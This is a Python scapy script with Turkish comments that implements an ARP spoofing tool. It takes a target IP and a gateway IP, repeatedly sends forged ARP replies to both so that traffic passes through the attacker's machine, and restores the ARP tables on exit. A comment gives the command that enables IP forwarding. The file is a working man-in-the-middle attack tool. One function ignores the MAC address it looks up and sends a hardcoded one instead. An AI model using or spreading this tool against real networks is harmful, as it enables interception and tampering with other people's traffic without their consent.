import scapy.all as scapy
import time
import optparse
# echo 1 > /proc/sys/net/ipv4/ip_forward




def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)  #ARP paketi oluşturma
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #bu mac adresi default modemlerin mac adresidir.
    combined_packet = broadcast_packet / arp_request_packet # 2 paketi tek pakette birleştirir
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]  # paketleri ağa gönderir cevapları toplar
    return answered_list[0][1].hwsrc



def arp_poisoning(target_ip, poisoned_ip):      #poisoned_ip => Modem IP

    target_mac = get_mac_address(target_ip)
                                                         #hwdst => hedef cihaz mac adresi
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst="08-00-27-D4-0B-4D", psrc= poisoned_ip)
    scapy.send(arp_response, verbose=False)
    #buraya kadar hedef cihazın kafasını karıştırıp, modem olduğumuzu söyledik

def reset_operation(fooled_ip, gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc= gateway_ip, hwsrc= gateway_mac)
    scapy.send(arp_response, verbose=False)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP!")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP!")
    options= parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP!!!!!")
    if not options.gateway_ip:
        print("Enter Gateway IP!!!!")
    return options

number = 0

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip


try:
    while True:
        arp_poisoning(user_target_ip, user_gateway_ip)  #hedef kullanıcıyı poisoning
        arp_poisoning(user_gateway_ip, user_target_ip)  #modemi poisoning

        number+=2

        print("\rSending packets " + str(number), end="")

        time.sleep(3) #loopa girmden önce 3 sn bekle
except KeyboardInterrupt:
    print("\n Quit & Reset")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)


